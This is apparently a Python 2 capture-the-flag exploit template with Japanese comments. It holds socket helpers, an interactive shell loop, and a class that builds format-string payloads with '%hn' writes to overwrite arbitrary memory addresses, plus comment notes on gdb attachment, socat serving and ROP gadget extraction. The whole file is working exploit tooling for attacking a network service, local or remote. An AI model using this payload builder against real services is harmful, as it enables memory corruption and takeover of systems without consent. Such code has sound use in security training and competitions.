#coding: utf-8
from socket import *
import time


def addr2s(x):
	res = ""
	for i in xrange(size_t):
		res += chr(x % 256)
		x /= 256
	return res

def s2hex(s):
	return map(lambda c: hex(ord(c)),s)
	
def s2addr(s):
	res = 0
	for i in xrange(size_t):
		res *= 256
		res += ord(s[size_t-i-1])
	return res
	
def shell():
	while True:
		sock.send(raw_input() + '\n')
		print sock.recv(1024)

def getunt(c):
	res = ""
	while res=='' or res[-len(c):]!=c:
		res += sock.recv(1)
		#print res
	print res
	return res

def send(s):
	#print '[sending :: %s]' % s
	sock.send(s)

def getshellc(fn):
	res = ""
	with open(fn,'rb') as fp:
		res = fp.read()
	print map(ord,res)
	return res


class FSB:
	def check_diff(sl):
		#return ''.join(map(lambda p: '%0x' + chr(p+ord('A')) , xrange(15)))
		return '%8x,' *  15
		#0x25,0x30,0x78,0x2c なので、そのへんを探す。
	def init(sl,kome,bytm,paynum,yet):
		#たとえば、deadbeef,cafebabe,abcd9876,3025cafe, ... なら、
		#fsb.init(kome=3,bytm=2,paynum=,yet=) で。

		sl.kome = kome
		sl.head = '*' * bytm
		#%hnでやっていきます
		sl.yet = yet + paynum * size_t * (size_t / 2) + bytm
		print 'yet .. ',sl.yet
		print yet
		#payloadは、yetとpaynum分ずれて出る。
		sl.data = []
		sl.npn = 0
	def add(sl,addr,val): #addrをvalにする
		
		for i in xrange(size_t/2): #x86なら2,x64なら4
			sl.head += addr2s(addr + i*2)
			sl.data.append((val % 0x10000, '%%%d$hn' % (sl.npn + sl.kome + 2)))
			val /= 0x10000
			sl.npn += 1
		#短い順にソートすることにより、ペイロードを短くする
		
	def get(sl):
		res = sl.head
		ny = sl.yet
		data = sorted(sl.data)
		for ty,s in data:
			dy = ((ty-ny + 0x10000) % 0x10000)
			if dy>0:
				res += '%%%dx' % dy
			res += s
			ny = ty
		#print len(sl.head)
		#print s2hex(sl.head)
		return res

#sudo gdb -q -p `pidof -s execfile` -x gdbcmd
#socat TCP-L:10001,reuseaddr,fork EXEC:./execfile

#./../../tools/rp-lin-x86 --file=mylibc --rop=3 --unique > mygads.txt

isgaibu = False
#isgaibu = True

sock = socket(AF_INET, SOCK_STREAM)
if isgaibu:
	sock.connect(("gaibu.sa-ba-", 10001))
	raw_input('gdb$')
		
else:
	sock.connect(("localhost", 10001))
	raw_input('gdb$')

size_t = 0x4 #x64かx86か。sizeof(void*) の値で。


